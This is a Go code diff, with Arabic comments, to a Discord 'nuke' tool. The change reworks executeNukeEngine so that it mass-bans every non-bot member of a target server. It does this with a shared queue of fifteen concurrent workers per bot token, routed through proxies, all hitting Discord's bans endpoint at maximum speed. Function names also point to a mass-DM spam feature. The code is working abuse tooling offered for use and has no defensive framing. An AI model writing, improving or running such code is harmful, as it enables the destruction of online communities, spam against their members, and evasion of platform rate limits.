@@ -248,7 +248,6 @@ func parseTokens(input interface{}) []string {
 	if !ok {
 		return nil
 	}
-	// يدعم الفواصل والمسافات لفصل التوكنات بكل مرونة
 	str = strings.ReplaceAll(str, ",", " ")
 	var res []string
 	for _, t := range strings.Fields(str) {
@@ -806,7 +805,7 @@ func executeCrossReferenceMassDM(tokens []string, userToken string, rawProxies [
 }
 
 // ==========================================
-// محرك Nuke1 الأقصى (Overdrive Mode - بدون فواصل وبأقصى سرعة)
+// محرك Nuke1 الأقصى المُصحّح (Overdrive Mode - طابور ديناميكي فائق السرعة)
 // ==========================================
 func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, includeBan bool, s *discordgo.Session) {
 	if len(tokens) == 0 {
@@ -846,7 +845,8 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 			}
 			for _, m := range members {
 				if m != nil && m.User != nil {
-					if !botIDs[m.User.ID] {
+					// استبعاد البوتات ومستخدم البوت الأساسي لمنع الفشل
+					if !botIDs[m.User.ID] && !m.User.Bot {
 						allUserIDs = append(allUserIDs, m.User.ID)
 					}
 					after = m.User.ID
@@ -898,30 +898,27 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 	}
 	wgDel.Wait()
 
-	// 2. إبادة الباندات (Overdrive Mode: بلا أي فواصل زمنية، ضربات متزامنة مطلقة)
+	// 2. إبادة الباندات (Dynamic Queue Mode: عمال متعددين يسحبون من الطابور المشترك بأقصى سرعة)
 	if includeBan && len(allUserIDs) > 0 && len(tokens) > 0 {
 		var wgBan sync.WaitGroup
-		totalUsers := len(allUserIDs)
+		banQueue := make(chan string, len(allUserIDs))
+		for _, uid := range allUserIDs {
+			banQueue <- uid
+		}
+		close(banQueue)
 
-		for i, token := range tokens {
+		// 15 عامل لكل توكن لتحقيق أقصى ضغط وتوازي ممكن
+		workersPerToken := 15
+		totalWorkers := len(tokens) * workersPerToken
+
+		for w := 0; w < totalWorkers; w++ {
 			wgBan.Add(1)
-			go func(tokenIdx int, botToken string) {
+			go func(workerIdx int) {
 				defer wgBan.Done()
-				client := clients[tokenIdx%len(clients)]
+				client := clients[workerIdx%len(clients)]
+				botToken := tokens[workerIdx%len(tokens)]
 
-				chunkSize := totalUsers / len(tokens)
-				start := tokenIdx * chunkSize
-				end := start + chunkSize
-				if tokenIdx == len(tokens)-1 {
-					end = totalUsers
-				}
-				if start >= totalUsers {
-					return
-				}
-
-				botQueue := allUserIDs[start:end]
-
-				for _, uid := range botQueue {
+				for uid := range banQueue {
 					urlStr := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
 					req, err := http.NewRequestWithContext(context.Background(), "PUT", urlStr, nil)
 					if err != nil {
@@ -937,7 +934,7 @@ func executeNukeEngine(tokens []string, rawProxies []string, guildID, botID, roo
 					}
 					resp.Body.Close()
 				}
-			}(i, token)
+			}(w)
 		}
 		wgBan.Wait()
 	}
